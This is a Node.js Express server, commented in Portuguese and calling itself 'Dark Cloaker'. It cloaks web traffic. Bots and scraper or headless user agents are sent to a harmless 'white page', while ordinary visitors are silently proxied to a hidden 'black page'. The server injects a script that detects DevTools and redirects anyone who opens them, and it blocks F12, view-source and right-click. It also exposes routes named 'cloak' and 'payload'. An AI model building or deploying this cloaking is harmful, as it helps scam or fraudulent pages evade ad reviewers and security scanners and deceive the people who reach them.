require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const helmet = require("helmet");
const redis = require("redis");
const axios = require("axios"); // ✅ substituindo fetch
const { isBot } = require("./utils/botDetection");
const { mutateHTMLSafe } = require("./utils/mutator");
const Domain = require("./models/Domain");

const app = express();

// 🔒 Middlewares globais
app.use(cors());
app.use(helmet());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 📂 Rotas da API
const authRoutes = require("./routes/auth.routes");
const cloakRoutes = require("./routes/cloak.routes");
const scriptRoutes = require("./routes/script.routes");
const payloadRoutes = require("./routes/payload.routes");
const domainRoutes = require("./routes/domain.routes");

app.use("/api/auth", authRoutes);
app.use("/api/cloak", cloakRoutes);
app.use("/api/domain", domainRoutes);
app.use("/cloak/script", scriptRoutes);
app.use("/api/payload", payloadRoutes);

// 🧠 Redis (opcional)
if (process.env.REDIS_URL) {
  const redisClient = redis.createClient({ url: process.env.REDIS_URL });
  redisClient.on("error", (err) => console.error("❌ Redis error:", err.message));
  redisClient.connect()
    .then(() => console.log("🔥 Redis conectado"))
    .catch((err) => console.error("❌ Redis erro:", err.message));
} else {
  console.warn("⚠️ Sem REDIS_URL → pulando Redis");
}

// ⚡ MongoDB
(async () => {
  try {
    await mongoose.connect(process.env.MONGO_URI);
    console.log("🔥 MongoDB conectado");
  } catch (err) {
    console.error("❌ Erro MongoDB:", err.message);
    process.exit(1);
  }
})();

// ⚔️ Middleware Reverse Proxy Blindado
app.use(async (req, res, next) => {
  try {
    const host = req.hostname;
    const ua = req.headers["user-agent"] || "";
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    const domain = await Domain.findOne({ officialUrl: `https://${host}` });
    if (!domain) return res.redirect("https://google.com");

    // Anti-bot primitivo
    if (isBot(ua, ip)) {
      return res.redirect(domain.baseUrl); // white page
    }

    // Headless & Devtools
    if (
      ua.length < 20 ||
      /Headless|Puppeteer|Scrapy|curl|python-requests|Go-http/i.test(ua)
    ) {
      return res.redirect(domain.fallbackUrl); // fallback tipo Google
    }

    // Conteúdo real da página preta
    const proxyUrl = domain.realUrl + req.originalUrl;
    const headers = {
      "User-Agent": ua,
      "X-Forwarded-For": ip,
      Referer: req.get("referer") || '',
    };

    const response = await axios.get(proxyUrl, { headers });
    const html = response.data;

    // Script Anti-Clonagem e DevTools
    const antiDevToolsScript = `
      <script>
        function devtoolsDetector(){
          const s = performance.now(); debugger; const e = performance.now();
          if(e-s>100){ window.location.href='${domain.fallbackUrl}'; }
        }
        setInterval(devtoolsDetector, 1000);
        document.addEventListener('keydown', function(e){
          if(
            e.key==='F12' ||
            (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) ||
            (e.ctrlKey && e.key==='U')
          ){
            e.preventDefault(); window.location.href='${domain.fallbackUrl}';
          }
        });
        document.addEventListener('contextmenu', e=>{
          e.preventDefault(); alert('🚫 Proibido clonar!');
        });
      </script>
    `;

    let mutated = mutateHTMLSafe(html);
    mutated = mutated.replace("</body>", `${antiDevToolsScript}</body>`);

    res.setHeader("Content-Type", "text/html; charset=utf-8");
    return res.send(mutated);

  } catch (err) {
    console.error("❌ Erro proxy blindado:", err);
    return res.redirect("https://google.com");
  }
});

// 🚀 Start
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`☠️ Dark Cloaker rodando blindado na porta ${PORT}`);
});
